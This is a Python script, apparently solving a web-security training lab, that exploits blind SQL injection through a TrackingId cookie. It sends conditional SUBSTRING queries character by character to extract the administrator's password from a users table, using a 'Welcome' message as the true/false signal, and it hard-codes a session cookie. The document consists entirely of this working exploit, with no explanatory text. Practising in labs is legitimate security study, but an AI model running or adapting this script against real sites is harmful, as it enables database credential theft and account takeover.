import requests
import string
import time

url = "https://0acb00b604553375807430a400680000.web-security-academy.net/filter?category=Gifts"
chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/\\"
password = ""
def test(payload):
    cookies = {
        "TrackingId": f"dDGeQctwLW3eyP9C{payload}",
        "session": "dbtW13tCC5ST8tR1zaUFc9B82NM0JRuP",
    }
    response = requests.get(url, cookies=cookies)
    print(response.status_code)
    return "Welcome" in response.text
for pos in range(1, 30):
    for char in chars:
        #time.sleep(0.1)
        payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator') = '{char}'--"
        if test(payload):
            password += char
            print(password)

